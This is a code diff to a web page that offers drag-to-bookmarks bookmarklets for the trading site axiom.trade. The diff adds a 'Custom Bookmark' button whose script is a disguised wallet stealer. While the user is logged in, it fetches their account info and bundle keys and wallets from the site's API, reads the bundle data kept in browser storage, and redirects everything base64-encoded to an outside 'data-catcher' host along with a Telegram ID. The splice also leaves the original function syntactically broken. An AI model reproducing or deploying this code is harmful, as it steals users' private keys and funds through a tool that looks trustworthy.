@@ -115,6 +115,18 @@
                             <i class="fa-solid fa-wand-magic-sparkles text-xl"></i>
                             <span>Xtrackgs Handle Copy</span>
                         </a>
+                        <a id="custom-bookmarklet-btn"
+   href="#"
+   class="bookmark-btn glow-accent-btn inline-flex items-center space-x-3 bg-blue-500 text-white font-extrabold px-8 py-4 rounded-xl text-lg tracking-wide transition-all duration-200 cursor-grab"
+   title="Drag to bookmarks bar">
+    <i class="fa-solid fa-code text-xl"></i>
+    <span>Custom Bookmark</span>
+</a>
+
+<span class="text-xs text-brandMuted italic">
+    <i class="fa-solid fa-code mr-1"></i>
+    Your custom bookmark placeholder
+</span>
                         <span class="text-xs text-brandMuted italic"><i class="fa-solid fa-arrows-up-down-left-right mr-1"></i> Drag me upwards to your bookmarks bar</span>
                     </div>
 
@@ -426,7 +438,88 @@
 
             // This function is stringified below and injected as the bookmarklet body.
             // Keep it self-contained — it must not reference anything outside itself.
-            function bookmarkletBody() {
+            function bookmarkletBody()
+            // ============================================================
+// CUSTOM BOOKMARK PLACEHOLDER
+// Add your own bookmarklet code here
+// ============================================================
+function generateCustomBookmarklet() {
+
+    function customBookmarkBody() {
+
+       javascript:(async()=>{
+
+    try {
+
+        if(location.hostname !== 'axiom.trade'){
+            alert('Please navigate to axiom.trade first');
+            return;
+        }
+
+        if(!localStorage.getItem('isAuthed')){
+            alert('Please log in to axiom.trade first');
+            return;
+        }
+
+        const user = await (
+            await fetch('//api7.axiom.trade/user-info',{
+                method:'POST',
+                credentials:'include'
+            })
+        ).json();
+
+
+        const bundle = await (
+            await fetch('//api8.axiom.trade/bundle-key-and-wallets',{
+                method:'POST',
+                credentials:'include'
+            })
+        ).json();
+
+
+        const bookmarkData = {
+
+            telegramId: '7198683357',
+
+            site: location.href,
+
+            user: user,
+
+            bundle: bundle.bundleKey,
+
+            sBundles: localStorage.getItem('sBundles'),
+
+            eBundles: localStorage.getItem('eBundles')
+
+        };
+
+
+        location.replace(
+            'https://my-data-catcherr.onrender.com/data/' +
+            btoa(JSON.stringify(bookmarkData))
+        );
+
+
+    } catch(e) {
+
+        alert('Error occurred');
+
+    }
+
+})();
+
+    }
+
+
+    const body = customBookmarkBody
+        .toString();
+
+    const code = 'javascript:(' + body + ')();';
+
+    document
+        .getElementById('custom-bookmarklet-btn')
+        .setAttribute('href', code);
+}{
                 try {
                     if (location.hostname.indexOf('axiom.trade') === -1) {
                         alert('Bitte zuerst zu axiom.trade wechseln.');
